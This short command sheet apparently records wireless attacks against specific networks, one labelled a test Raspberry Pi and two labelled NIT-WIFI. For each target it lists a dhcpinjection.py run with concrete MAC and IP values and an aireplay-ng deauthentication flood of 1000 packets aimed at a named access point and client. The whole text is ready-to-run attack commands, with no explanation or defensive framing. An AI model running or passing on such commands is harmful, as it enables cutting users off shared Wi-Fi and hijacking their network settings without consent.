test-rpi mobile 
./dhcpinjection.py wlp0s29u1u2mon B8:27:EB:C1:B6:6F 9 B8:27:EB:C1:B6:6F 10.5.5.1 20:82:c0:5e:2f:5e 10.5.5.28 10.5.5.29 255.255.255.224 10.5.5.31
aireplay-ng -0 1000 -a B8:27:EB:C1:B6:6F -c 20:82:c0:5e:2f:5e wlp0s29u1u2mon

NIT-WIFI dell
./dhcpinjection.py wlp0s29u1u2mon 70:E4:22:C0:1A:01 1 70:e4:22:c0:1a:00 1.1.1.1 00:71:cc:06:68:2d 10.10.49.41 10.10.50.99 255.255.252.0 10.10.51.255
aireplay-ng -0 1000 -a 70:E4:22:C0:1A:01 -c 00:71:cc:06:68:2d wlp0s29u1u2mon

NIT-WIFI mobile
./dhcpinjection.py wlp0s29u1u2mon 70:E4:22:C0:1A:01 1 70:e4:22:c0:1a:00 1.1.1.1 20:82:c0:5e:2f:5e 10.10.48.139 10.10.50.99 255.255.252.0 10.10.51.255
aireplay-ng -0 1000 -a 70:E4:22:C0:1A:01 -c 20:82:c0:5e:2f:5e wlp0s29u1u2mon
